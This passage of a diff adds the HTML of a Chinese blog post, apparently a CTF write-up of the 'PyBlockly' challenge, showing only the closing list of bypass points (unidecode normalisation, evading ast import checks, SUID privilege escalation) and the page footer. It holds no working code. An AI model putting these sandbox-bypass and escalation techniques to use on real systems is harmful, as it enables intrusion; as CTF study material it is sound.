+</ol>
+</li>
+</ol>
+<h3 id="绕过点1-unidecode-unidecode"><a href="#绕过点1-unidecode-unidecode" class="headerlink" title="绕过点1: unidecode.unidecode"></a>绕过点1: unidecode.unidecode</h3><blockquote>
+<p>脚本技巧，见同名unidecode</p>
+</blockquote>
+<h3 id="绕过点2-ast-Import和ast-ImportFrom"><a href="#绕过点2-ast-Import和ast-ImportFrom" class="headerlink" title="绕过点2: ast.Import和ast.ImportFrom"></a>绕过点2: ast.Import和ast.ImportFrom</h3><blockquote>
+<p>多多ai并查就好了</p>
+</blockquote>
+<ol>
+<li>Import 语句：<ol>
+<li>Import 节点表示一个 import 语句，用于导入整个模块或多个模块。</li>
+<li>例如：import os 或 import sys, os。</li>
+</ol>
+</li>
+<li>ImportFrom 语句：<ol>
+<li>ImportFrom 节点表示一个 from … import 语句，用于从模块中导入特定的名称。</li>
+<li>例如：from os import path 或 from sys import version as ver’</li>
+</ol>
+</li>
+</ol>
+<h3 id="绕过点3-suid提权"><a href="#绕过点3-suid提权" class="headerlink" title="绕过点3: suid提权"></a>绕过点3: suid提权</h3><blockquote>
+<p>详见文章Linux提权，这里不做原理介绍</p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%8E%E5%B0%9D%E8%AF%95"><span class="toc-number">1.</span> <span class="toc-text">分析与尝试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E4%B8%9C%E8%A5%BF"><span class="toc-number">3.</span> <span class="toc-text">新东西</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">3.1.</span> <span class="toc-text">*关于字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%82%B91-unidecode-unidecode"><span class="toc-number">3.2.</span> <span class="toc-text">绕过点1: unidecode.unidecode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%82%B92-ast-Import%E5%92%8Cast-ImportFrom"><span class="toc-number">3.3.</span> <span class="toc-text">绕过点2: ast.Import和ast.ImportFrom</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%82%B93-suid%E6%8F%90%E6%9D%83"><span class="toc-number">3.4.</span> <span class="toc-text">绕过点3: suid提权</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&text=PyBlockly_强网24"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&title=PyBlockly_强网24"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&is_video=false&description=PyBlockly_强网24"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PyBlockly_强网24&body=Check out this article: https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&title=PyBlockly_强网24"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&title=PyBlockly_强网24"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&title=PyBlockly_强网24"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&title=PyBlockly_强网24"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&name=PyBlockly_强网24&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&t=PyBlockly_强网24"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
